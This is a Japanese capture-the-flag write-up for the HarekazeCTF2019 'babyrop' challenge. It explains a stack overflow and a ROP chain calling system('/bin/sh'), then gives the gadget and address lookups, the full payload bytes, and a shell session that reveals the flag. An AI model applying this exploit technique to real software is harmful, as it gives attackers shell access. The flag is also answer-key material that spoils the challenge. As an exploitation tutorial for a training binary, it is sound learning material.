## babyrop

スタックは次のようになっている。

```txt
input[16]
---------
rbp
---------
ret addr
```

このreturnアドレスの部分にROPガジェット`pop rdi; ret`を指すアドレスを書き込み、その下に`/bin/sh`という文字列のアドレス、その下に命令`call sym.imp.system`を指すアドレスを書き込む。すると次のようになる。

```txt
input[16]-> 適当な文字列（16バイト）
---------
rbp      -> 適当な文字列（8バイト）
---------
ret addr -> pop rdi; ret
---------
         -> "/bin/sh"
---------
         -> system()
```

スタックがこの状態だと、次のように処理が行われる。

1. `main()`関数が`ret`に到達する
2. returnアドレスが指す先に戻る。ここではアドレスが書き換えられているため`pop rdi; ret`という処理に移る
3. `pop rdi`が実行され、"/bin/sh"という文字列がレジスタ`rdi`に入る
4. `ret`が実行され、returnアドレスが指す先、つまり`system()`関数に飛ぶ
    - rdiに"/bin/sh"が入っているので、`system("/bin/sh")`が実行される 
5. シェル奪取に成功！

さて、スタックを上の状態にするには以下の情報が必要である。

1. `pop rdi; ret`のアドレス
    - `ROPgadget`を使うと調べられる。`0x400683`
```terminal
%  ROPgadget --binary babyrop | grep "pop rdi"
0x0000000000400683 : pop rdi ; ret
```
2. 文字列"/bin/sh"のアドレス
    - `gef`の機能で調べられる。`0x601048`
```txt
gef➤  search-p /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/home/ytaka/CTF/rop/babyrop'(0x601000-0x602000), permission=rw-
  0x601048 - 0x60104f  →   "/bin/sh"  <= 今回はこちらを使う
[+] In '/usr/lib/x86_64-linux-gnu/libc.so.6'(0x7ffff7f47000-0x7ffff7f9f000), permission=r--
  0x7ffff7f62678 - 0x7ffff7f6267f  →   "/bin/sh"
```
3. `system()`のアドレス
    - `main()`関数で使用しているのですぐわかる。`0x4005e3`
```txt
%  objdump -d babyrop | grep "system@plt"
0000000000400490 <system@plt>:
  4005e3:       e8 a8 fe ff ff          call   400490 <system@plt> <= これ
```

必要な情報が揃ったので、ペイロードを書いて送る。  
なぜか`echo XX | ./babyrop`のようにパイプで繋いでもうまくいかなかったので、`echo XX > attack.bin`のように一旦別ファイルに保存してから、`cat attack.bin - | ./babyrop`を実行した。  
また、これまたなぜかローカルに落とした`./babyrop`を使ってもSegmentation faultが出てしまうので、GitHubにあったDocker環境を使って実行してみた。 -> <https://github.com/TeamHarekaze/HarekazeCTF2019-challenges/blob/master/baby_rop/server/Dockerfile>

※補足：`cat`において`-`は標準入力を意味する。ふつう`cat hoge.txt`を実行するとhoge.txtが表示されて終わりだが、`cat hoge.txt -`とすれば、hoge.txtが出力された後にも標準入力からの入力を受け付ける。これを利用し、`cat hoge.txt - | ./XXX`とすれば、`./XXX`にhoge.txtの内容を送って終わりではなく、入力を受け付けるようになる。

※追記：`echo`でプログラムに入力を渡した後でも、標準入力を渡すようにしたいとき、次のようにすればよい。
`(echo -e '\xef\xbe\xad\xde'; cat) | ./program` (<https://mymanfile.com/?p=4564>)

```terminal
$ echo -e "AAAAAAAAAAAAAAAABBBBBBBB\x83\x06\x40\x00\x00\x00\x00\x00\x48\x10\x60\x00\x00\x00\x00\x00\xe3\x05\x40\x00\x00\x00\x00\x00" > attack.bin
$ cat attack.bin - | nc localhost 60680
What's your name? ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd /home
ls
babyrop
cd babyrop
ls
babyrop
flag
cat flag
HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}
```

